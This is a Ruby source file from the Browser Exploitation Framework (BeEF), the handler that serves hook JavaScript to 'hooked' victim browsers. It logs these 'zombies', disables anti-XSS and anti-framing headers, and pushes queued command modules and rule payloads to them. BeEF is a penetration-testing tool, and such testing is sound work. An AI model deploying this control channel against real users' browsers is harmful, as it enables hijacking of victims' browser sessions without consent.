#
# Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
module Core
module Handlers

   # @note This class handles connections from hooked browsers to the framework.
    class HookedBrowsers < BeEF::Core::Router::Router


    include BeEF::Core::Handlers::Modules::BeEFJS
    include BeEF::Core::Handlers::Modules::LegacyBeEFJS
    include BeEF::Core::Handlers::Modules::Command

    #antisnatchor: we don't want to have anti-xss/anti-framing headers in the HTTP response for the hook file.
    configure do
      disable :protection
    end

    # Process HTTP requests sent by a hooked browser to the framework.
    # It will update the database to add or update the current hooked browser
    # and deploy some command modules or extensions to the hooked browser.
    get '/' do
      @body = ''
      params = request.query_string
      #@response = Rack::Response.new(body=[], 200, header={})
      config = BeEF::Core::Configuration.instance

      # @note check source ip address of browser
      permitted_hooking_subnet = config.get('beef.restrictions.permitted_hooking_subnet')
      if permitted_hooking_subnet.nil? || permitted_hooking_subnet.empty?
        BeEF::Core::Logger.instance.register('Target Range', "Attempted hook from outside of permitted hooking subnet (#{request.ip}) rejected.")
	      error 404
      end

      found = false
      permitted_hooking_subnet.each do |subnet|
        found = true if IPAddr.new(subnet).include?(request.ip)
      end

      unless found
        BeEF::Core::Logger.instance.register('Target Range', "Attempted hook from outside of permitted hooking subnet (#{request.ip}) rejected.")
        error 404
      end

      excluded_hooking_subnet = config.get('beef.restrictions.excluded_hooking_subnet')
      unless excluded_hooking_subnet.nil? || excluded_hooking_subnet.empty?
        excluded_ip_hooked = false

        excluded_hooking_subnet.each do |subnet|
          excluded_ip_hooked = true if IPAddr.new(subnet).include?(request.ip)
        end

        if excluded_ip_hooked
          BeEF::Core::Logger.instance.register('Target Range', "Attempted hook from excluded hooking subnet (#{request.ip}) rejected.")
          error 404 
        end
      end

      # @note get zombie if already hooked the framework
      hook_session_name = config.get('beef.http.hook_session_name')
      hook_session_id = request[hook_session_name]
      begin
        raise ActiveRecord::RecordNotFound if hook_session_id.nil?
        hooked_browser = BeEF::Core::Models::HookedBrowser.where(:session => hook_session_id).first
      rescue ActiveRecord::RecordNotFound
        hooked_browser = false
      end

      # @note is a new browser so return instructions to set up the hook
      if not hooked_browser

        # @note generate the instructions to hook the browser
        host_name = request.host
        (print_error "Invalid host name";return) if not BeEF::Filters.is_valid_hostname?(host_name)

        # Generate the hook js provided to the hookwed browser (the magic happens here)
        if BeEF::Core::Configuration.instance.get("beef.http.websocket.enable")
          build_beefjs!(host_name)
        else
          legacy_build_beefjs!(host_name)
        end
      # @note is a known browser so send instructions
      else
        # @note Check if we haven't seen this browser for a while, log an event if we haven't
        if (Time.new.to_i - hooked_browser.lastseen.to_i) > 60
          BeEF::Core::Logger.instance.register('Zombie',"#{hooked_browser.ip} appears to have come back online","#{hooked_browser.id}")
        end

        # @note record the last poll from the browser
        hooked_browser.lastseen = Time.new.to_i

        # @note Check for a change in zombie IP and log an event
        if config.get('beef.http.use_x_forward_for') == true
          if hooked_browser.ip != request.env["HTTP_X_FORWARDED_FOR"]
            BeEF::Core::Logger.instance.register('Zombie',"IP address has changed from #{hooked_browser.ip} to #{request.env["HTTP_X_FORWARDED_FOR"]}","#{hooked_browser.id}")
            hooked_browser.ip = request.env["HTTP_X_FORWARDED_FOR"]
          end
        else
          if hooked_browser.ip != request.ip
           BeEF::Core::Logger.instance.register('Zombie',"IP address has changed from #{hooked_browser.ip} to #{request.ip}","#{hooked_browser.id}")
           hooked_browser.ip = request.ip
          end
        end

        hooked_browser.count!
        hooked_browser.save!

        # @note add all available command module instructions to the response
        zombie_commands = BeEF::Core::Models::Command.where(:hooked_browser_id => hooked_browser.id, :instructions_sent => false)
        zombie_commands.each{|command| add_command_instructions(command, hooked_browser)}

        # @note Check if there are any ARE rules to be triggered. If is_sent=false rules are triggered
        are_executions = BeEF::Core::Models::Execution.where(:is_sent => false, :session_id => hook_session_id)
        are_executions.each do |are_exec|
          @body += are_exec.mod_body
          are_exec.update(:is_sent => true, :exec_time => Time.new.to_i)
        end

        # @note We dynamically get the list of all browser hook handler using the API and register them
        BeEF::API::Registrar.instance.fire(BeEF::API::Server::Hook, 'pre_hook_send', hooked_browser, @body, params, request, response)
      end

      # @note set response headers and body
     headers  'Pragma' => 'no-cache',
              'Cache-Control' => 'no-cache',
              'Expires' => '0',
              'Content-Type' => 'text/javascript',
              'Access-Control-Allow-Origin' => '*',
              'Access-Control-Allow-Methods' => 'POST, GET'
      @body
    end
  end

end
end
end
